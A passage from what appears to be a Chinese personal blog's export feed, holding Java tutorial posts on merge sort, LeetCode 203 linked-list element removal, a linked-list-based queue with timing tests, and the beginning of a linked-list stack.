<h1 id="归并排序执行（完整代码）"><a href="#归并排序执行（完整代码）" class="headerlink" title="归并排序执行（完整代码）"></a>归并排序执行（完整代码）</h1><h2 id="MergeSort-java"><a href="#MergeSort-java" class="headerlink" title="MergeSort.java"></a>MergeSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">MergeSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        sort(arr, <span class="number">0</span> , arr.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt;<span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid  = (l  +  r ) / <span class="number">2</span>;</span><br><span class="line">        sort(arr, l, mid);</span><br><span class="line">        sort(arr, mid+<span class="number">1</span>, r);</span><br><span class="line">        merge(arr, l , mid , r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并两个有序的区间 arr[l...mid] 和 arr[mid + 1, r]</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> mid, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E[] temp = Arrays.copyOfRange(arr, l , r + <span class="number">1</span>); <span class="comment">//前闭后开，所以要r+1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = l, j = mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//每轮循环为arr[k]赋值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = l ; k &lt;= r ; k ++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &gt; mid) &#123;</span><br><span class="line">                arr[k] = temp[j - l]; j ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; r)&#123;</span><br><span class="line">                arr[k] = temp[i - l]; i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(temp[i - l].compareTo(temp[j - l]) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                arr[k] = temp[i - l]; i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                arr[k] = temp[j - l]; j ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// arr[i] 和 arr[j]</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">100000</span>;</span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">        MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java-生成随机n个元素的数组"><a href="#ArrayGenerator-java-生成随机n个元素的数组" class="headerlink" title="ArrayGenerator.java(生成随机n个元素的数组)"></a>ArrayGenerator.java(生成随机n个元素的数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】LeetCode题答-203移除链表元素</title>
    <url>/posts/41.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LeetCood题目"><a href="#LeetCood题目" class="headerlink" title="LeetCood题目"></a>LeetCood题目</h1><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gylq.gitee.io/cloudimages/img/image-20210626190731545.png" alt="image-20210626190731545"></h2><h1 id="题答1（完整代码）"><a href="#题答1（完整代码）" class="headerlink" title="题答1（完整代码）"></a>题答1（完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="keyword">null</span> &amp;&amp; head.val == val)&#123;</span><br><span class="line">            ListNode delNode = head;</span><br><span class="line">            head = head.next;</span><br><span class="line">            delNode.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        ListNode prev = head;</span><br><span class="line">        <span class="keyword">while</span>(prev.next != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.next.val == val) &#123;</span><br><span class="line">                ListNode delNode = prev.next;</span><br><span class="line">                prev.next = delNode.next;</span><br><span class="line">                delNode.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="题答2（利用虚拟头）"><a href="#题答2（利用虚拟头）" class="headerlink" title="题答2（利用虚拟头）"></a>题答2（利用虚拟头）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode dummyHead = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        ListNode prev = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(prev.next != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.next.val == val) &#123;</span><br><span class="line">                ListNode delNode = prev.next;</span><br><span class="line">                prev.next = delNode.next;</span><br><span class="line">                delNode.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="题解3（利用链表递归）和原理图"><a href="#题解3（利用链表递归）和原理图" class="headerlink" title="题解3（利用链表递归）和原理图"></a>题解3（利用链表递归）和原理图</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210627024604937.png" alt="image-20210627024604937"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) <span class="comment">//最小规模情况结束条件</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        head.next = removeElements(head.next, val);</span><br><span class="line">        <span class="keyword">return</span> head.val == val ? head.next : head; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="本地测试截图"><a href="#本地测试截图" class="headerlink" title="本地测试截图"></a>本地测试截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626190930982.png" alt="image-20210626190930982"></p>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表实现队列(完整代码)</title>
    <url>/posts/42.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="链表实现队列的接口"><a href="#链表实现队列的接口" class="headerlink" title="链表实现队列的接口"></a>链表实现队列的接口</h1><h2 id="Queue-java"><a href="#Queue-java" class="headerlink" title="Queue.java"></a>Queue.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">dequeue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="链表实现队列操作执行结果"><a href="#链表实现队列操作执行结果" class="headerlink" title="链表实现队列操作执行结果"></a>链表实现队列操作执行结果</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626170535468.png" alt="image-20210626170535468"></p>
<h1 id="链表实现队列操作（完整代码）"><a href="#链表实现队列操作（完整代码）" class="headerlink" title="链表实现队列操作（完整代码）"></a>链表实现队列操作（完整代码）</h1><h2 id="LinkedListQueue-java（实现队列的操作）"><a href="#LinkedListQueue-java（实现队列的操作）" class="headerlink" title="LinkedListQueue.java（实现队列的操作）"></a>LinkedListQueue.java（实现队列的操作）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span> </span>&#123; <span class="keyword">this</span>(e, <span class="keyword">null</span>);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span> </span>&#123;<span class="keyword">this</span>(<span class="keyword">null</span>, <span class="keyword">null</span>);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> e.toString(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node head, tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedListQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head = <span class="keyword">null</span>;</span><br><span class="line">        tail = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tail == <span class="keyword">null</span>)&#123;</span><br><span class="line">            tail = <span class="keyword">new</span> Node(e);</span><br><span class="line">            head = tail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail.next = <span class="keyword">new</span> Node(e);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot dequeue from an empty queue."</span>);</span><br><span class="line"></span><br><span class="line">        Node retNode = head;</span><br><span class="line">        head = head.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            tail = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Queue is empty"</span>);</span><br><span class="line">        <span class="keyword">return</span> head.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Queue: front "</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append((cur + <span class="string">"-&gt;"</span>));</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"NULL tail"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedListQueue&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)&#123;</span><br><span class="line">            queue.enqueue(i);</span><br><span class="line">            System.out.println(queue);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">2</span>)&#123;</span><br><span class="line">                queue.dequeue();</span><br><span class="line">                System.out.println(queue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图"><a href="#我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图" class="headerlink" title="我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图"></a>我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图</h1><blockquote>
<ul>
<li><h2 id="明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右"><a href="#明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右" class="headerlink" title="明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右"></a>明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右</h2></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626170306274.png" alt="image-20210626170306274"></p>
<h1 id="测试时间代码"><a href="#测试时间代码" class="headerlink" title="测试时间代码"></a>测试时间代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试使用q运行opCount个enqueue和dequeue操作所需要的时间，单位：秒</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">testQueue</span><span class="params">(Queue&lt;Integer&gt; q, <span class="keyword">int</span> opCount)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">            q.enqueue(random.nextInt(Integer.MAX_VALUE));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount ; i ++)</span><br><span class="line">            q.dequeue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (endTime - startTime) / <span class="number">100000000.0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> opCount = <span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line">        LoopQueue&lt;Integer&gt; loopQueue = <span class="keyword">new</span> LoopQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time1 = testQueue(loopQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"LoopQueue , time: "</span> + time1 + <span class="string">"s"</span>);</span><br><span class="line">        ArrayQueue&lt;Integer&gt; arrayQueue = <span class="keyword">new</span> ArrayQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time2 = testQueue(arrayQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"arrayQueue , time: "</span> + time2 + <span class="string">"s"</span>);</span><br><span class="line">        LinkedListQueue&lt;Integer&gt; linkedListQueue = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time3 = testQueue(linkedListQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"LinkedListQueue , time: "</span> + time3 + <span class="string">"s"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>链表实现队列</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表实现栈(完整代码)</title>
    <url>/posts/40.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="链表实现栈的接口"><a href="#链表实现栈的接口" class="headerlink" title="链表实现栈的接口"></a>链表实现栈的接口</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626155905712.png" alt="image-20210626155905712"></p>
<h1 id="链表实现栈操作执行结果"><a href="#链表实现栈操作执行结果" class="headerlink" title="链表实现栈操作执行结果"></a>链表实现栈操作执行结果</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626162121811.png" alt="image-20210626162121811"></p>
<h1 id="链表实现栈的完整代码"><a href="#链表实现栈的完整代码" class="headerlink" title="链表实现栈的完整代码"></a>链表实现栈的完整代码</h1><h2 id="Stack-java"><a href="#Stack-java" class="headerlink" title="Stack.java"></a>Stack.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="LinkedList-java-上一个发的文章实现链表的内容"><a href="#LinkedList-java-上一个发的文章实现链表的内容" class="headerlink" title="LinkedList.java(上一个发的文章实现链表的内容)"></a>LinkedList.java(上一个发的文章实现链表的内容)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = 